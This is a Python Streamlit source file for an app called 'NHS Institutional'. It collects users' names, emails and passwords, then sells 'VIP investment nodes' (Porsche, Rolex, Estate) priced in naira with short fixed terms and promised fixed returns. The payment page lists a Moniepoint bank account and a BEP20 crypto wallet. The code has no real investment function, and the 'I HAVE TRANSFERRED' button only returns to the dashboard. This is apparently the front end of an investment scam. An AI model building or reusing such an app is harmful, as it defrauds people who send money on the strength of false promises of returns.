import streamlit as st

# --- [1. SYSTEM SETTINGS] ---
st.set_page_config(page_title="NHS Institutional", page_icon="📈", layout="centered")

# --- [2. PRO-FINTECH STYLING] ---
st.markdown("""
    <style>
    /* Force all input and header text to be visible (Black/Blue) */
    h1, h2, h3, h4, p, span { color: #1e293b !important; }
    input { color: #000000 !important; font-weight: bold !important; }
    .stApp { background-color: #ffffff; }
    
    /* Welcome Header Styling */
    .welcome-text { color: #00aeef !important; font-size: 1.8rem; font-weight: 800; margin-bottom: 20px; }
    
    /* VIP Cards */
    .vip-card { background: #ffffff; border-radius: 15px; padding: 20px; margin-bottom: 20px; 
               border: 1px solid #e2e8f0; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
    .vip-img { width: 100%; border-radius: 12px; height: 180px; object-fit: cover; }
    
    /* Payment Box */
    .pay-container { background: #f0f9ff; border-radius: 15px; padding: 25px; border: 2px solid #00aeef; }
    
    /* Professional Buttons */
    div.stButton > button {
        background: #00aeef !important; color: #ffffff !important;
        border-radius: 10px !important; width: 100% !important;
        height: 50px !important; font-weight: bold !important; border: none !important;
    }
    </style>
""", unsafe_allow_html=True)

# --- [3. APP STATE CONTROL] ---
if "page" not in st.session_state: st.session_state.page = "reg"
if "user" not in st.session_state: st.session_state.user = ""

# --- [4. REGISTRATION PAGE] ---
if st.session_state.page == "reg":
    st.markdown("<h2 style='text-align:center;'>NHS Registration</h2>", unsafe_allow_html=True)
    f_name = st.text_input("First Name", placeholder="Input your first name")
    l_name = st.text_input("Last Name", placeholder="Input your last name")
    u_name = st.text_input("Username", placeholder="Input your username")
    email = st.text_input("Email", placeholder="Input your email")
    pwd = st.text_input("Password", type="password", placeholder="Input password")
    
    if st.button("COMPLETE REGISTRATION"):
        if u_name:
            st.session_state.user = u_name
            st.session_state.page = "dash"
            st.rerun()
        else:
            st.warning("Please fill in your username.")

# --- [5. HOME DASHBOARD] ---
elif st.session_state.page == "dash":
    st.markdown(f"<div class='welcome-text'>Welcome, {st.session_state.user}</div>", unsafe_allow_html=True)
    
    st.image("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=800", caption="NHS Global HQ")
    
    st.markdown("""
        <div style="background:#f8fafc; padding:20px; border-radius:10px; border-left:4px solid #00aeef;">
            <b>Institutional Profile:</b> NHS specializes in high-yield asset management. 
            By activating a node, you are participating in a fixed-return smart contract.
        </div>
    """, unsafe_allow_html=True)

    st.divider()
    if st.button("💎 OPEN INVESTMENT PORTFOLIOS"):
        st.session_state.page = "invest"
        st.rerun()

# --- [6. INVESTMENT PAGE] ---
elif st.session_state.page == "invest":
    st.markdown("### Select Investment Node")
    
    vips = [
        {"id": "1", "name": "VIP 1 (Porsche Node)", "price": "5,000", "days": "30", "img": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400"},
        {"id": "2", "name": "VIP 2 (Rolex Node)", "price": "15,000", "days": "20", "img": "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400"},
        {"id": "3", "name": "VIP 3 (Estate Node)", "price": "35,000", "days": "20", "img": "https://images.unsplash.com/photo-1512917774080-9991f1c4c750?w=400"},
    ]

    for v in vips:
        st.markdown(f"""
            <div class="vip-card">
                <img src="{v['img']}" class="vip-img">
                <h4 style="margin:10px 0;">{v['name']}</h4>
                <h2 style="margin:0; color:#00aeef;">₦ {v['price']}</h2>
                <p>Term: {v['days']} Days</p>
            </div>
        """, unsafe_allow_html=True)
        if st.button(f"Activate {v['name']}", key=v['id']):
            st.session_state.page = "pay"
            st.rerun()
            
    if st.button("⬅️ BACK TO DASHBOARD"):
        st.session_state.page = "dash"
        st.rerun()

# --- [7. PAYMENT PAGE] ---
elif st.session_state.page == "pay":
    st.markdown("### Official Settlement")
    st.markdown(f"""
        <div class="pay-container">
            <p style="margin:0; font-size:0.8rem; color:#64748b;">BANK</p>
            <h4 style="margin:0;">Moniepoint</h4>
            <p style="margin:15px 0 0 0; font-size:0.8rem; color:#64748b;">ACCOUNT NAME</p>
            <h4 style="margin:0;">{st.session_state.user} (NHS)</h4>
            <p style="margin:15px 0 0 0; font-size:0.8rem; color:#64748b;">ACCOUNT NUMBER</p>
            <h2 style="margin:0; color:#00aeef; letter-spacing:2px;">8126419410</h2>
        </div>
        <br>
        <div style="background:#fff7ed; padding:15px; border-radius:10px; border:1px solid #f7931a;">
            <p style="margin:0; font-size:0.8rem; color:#9a3412;"><b>CRYPTO BEP20:</b><br>
            0x7b3336E08e8E37E468f78087263b610F584C1C4f</p>
        </div>
    """, unsafe_allow_html=True)
    
    if st.button("I HAVE TRANSFERRED"):
        st.success("Transaction submitted. Returning to Dashboard...")
        st.session_state.page = "dash"
        st.rerun()

    if st.button("CANCEL & RETURN HOME"):
        st.session_state.page = "dash"
        st.rerun()
    
